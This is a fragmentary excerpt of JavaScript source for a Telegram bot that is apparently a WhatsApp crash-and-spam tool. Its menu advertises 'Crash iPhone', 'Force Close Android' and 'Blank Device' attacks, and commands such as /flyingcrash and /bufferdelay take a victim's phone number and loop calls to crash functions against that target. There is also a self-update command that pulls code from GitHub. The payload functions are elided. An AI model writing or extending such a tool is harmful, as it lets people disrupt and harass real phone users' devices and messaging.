...
const thumbnailUrl = "https://files.catbox.moe/4jft9o.jpg";
...
⚔️  P O W E R  •  E F F E C T S
• Delay Invisible — Extreme Lag  
• Crash iPhone — Force Home  
• Blank Device — Screen Void  
• Spam Delay Engine — Hyper Freeze  
• Force Close Android - Invisible Android
...
• /oxlike - Force Message 
• /oxford - Force Call Message
...
if (!groupOnly(ctx)) return;
    ...
    try {
      ...
      const groupId = chatType === "private" ? "Private Chat" : ctx.chat.id;
      const groupName =
        chatType === "private"
          ? "Private Chat"
...
💬 <b>Command</b> : <code>${commandText}</code>
⏰ <b>Waktu</b> : ${timeNow}
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    if (!q) return ctx.reply("Format: /darkcix 62×××");
...
<b>🐰 Gold Execute Engine Started…</b>
    ...
    const msgId = processMsg.message_id;
    for (let i = 0; i < 5; i++) {
      await privatedelay();      
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Infinity Notag Story 
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 DarkCix Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /newsletter 62×××");
...
<b>🐰 Channel For Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /lianvix 62×××");
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /gloxbord 62×××");
...
<b>🐰 Crash Android Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
...
<b>🐰 Force Close Invisible Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /bufferdelay 62×××");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Infinity Delay
<b>⟢ Status :</b> <i>Processing...</i>

<b>🐰 Infinity Android Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
    ...
    const msgId = processMsg.message_id;
    for (let i = 0; i < 10; i++) {
      await YTXteri(sock, target);
    await YTXstc(sock, target);
      await privatedelay();
    }
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
...
<b>🐰 Infinity Delay Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /forcesql 62×××");
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /stickerfc 62×××");
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /execute 62×××");
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /hoxlive 62×××");
...
bot.command(
  ...
  async (ctx) => {
    ...
    try {
      ...
      const commandText = ctx.message.text;
      const timeNow = new Date().toLocaleString("en-GB", { timeZone: "Asia/Jakarta" });
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /obfors 62×××");
...
<b>🐰 Blank Device Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
...
<b>🐰 Red Flower Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /flyingcrash 62×××");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Crash Android  
<b>⟢ Status :</b> <i>Processing...</i>
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Force Android  
<b>⟢ Status :</b> <i>Success ✓</i>
...
<b>🐰 Crash Android Engine Started…</b>
    ...
    const msgId = processMsg.message_id;
    for (let i = 0; i < 12; i++) {
      await flyingcrash(sock, target, true);
    await flyingcrash(sock, target, true);
      await privatedelay();
    }
    await ctx.telegram.editMessageCaption(
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /oxford 62×××");
...
<b>🐰 Crash Android Engine Started…</b>
    ...
    const msgId = processMsg.message_id;
    for (let i = 0; i < 12; i++) {
      await flycrash(sock, target, true);
    await flycrash(sock, target, true);
      await privatedelay();
    }
    await ctx.telegram.editMessageCaption(
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /creodash 62×××");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Force Close Delete  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Force Close Delete Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /occolot 62×××");
...
<b>🐰 Crash Android Engine Started…</b>
    ...
    const msgId = processMsg.message_id;
    for (let i = 0; i < 1; i++) {
      await xatanicalalbum(sock, target, true);
      await privatedelay();
    }
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /mediacall 62×××");
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /croserd 62×××");
...
🏷 <b>Nama Grup</b> : ${groupName}
    ...
    // ==========================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /gloryposx 62×××");
...
<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Calling Blank  
<b>⟢ Status :</b> <i>Processing...</i>

<b>🐰 Blank Calling Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
...
bot.command("pullupdate", async (ctx) => {
    try {
        if (ctx.from.id != ownerID) {
            return ctx.reply("❌ Akses khusus owner.");
        }

        ctx.reply("⏳ Mengambil update clover.js dari GitHub API...");
        ...
        if (!res.ok) return ctx.reply("❌ Tidak dapat mengambil data dari GitHub.");

        const data = await res.json();

        if (!data.content) return ctx.reply("❌ File clover.js tidak ditemukan di GitHub.");
        ...
        ctx.reply("✅ clover.js berhasil diupdate dari GitHub API!\n♻️ Restarting bot...");
        ...
        console.error(err);
        ctx.reply("❌ Gagal update dari GitHub API.");
    }
});
